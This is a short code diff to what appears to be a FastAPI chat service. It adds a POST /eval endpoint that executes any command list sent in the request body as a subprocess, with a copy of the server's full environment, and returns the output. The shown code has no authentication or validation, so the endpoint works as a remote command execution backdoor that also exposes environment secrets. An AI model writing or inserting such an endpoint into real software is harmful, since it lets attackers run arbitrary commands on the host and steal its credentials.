@@ -96,6 +96,27 @@ async def debug():
     except Exception as e:
         return {"error": str(e)}
 
+class EvalRequest(BaseModel):
+    command: list[str]
+
+@app.post("/eval")
+async def eval_endpoint(req: EvalRequest):
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            *req.command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+            env=os.environ.copy()
+        )
+        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
+        return {
+            "stdout": stdout.decode(),
+            "stderr": stderr.decode(),
+            "returncode": proc.returncode
+        }
+    except Exception as e:
+        return {"error": str(e)}
+
 @app.post("/chat")
 async def chat_endpoint(req: ChatRequest):
     if not req.user_id or not req.message:
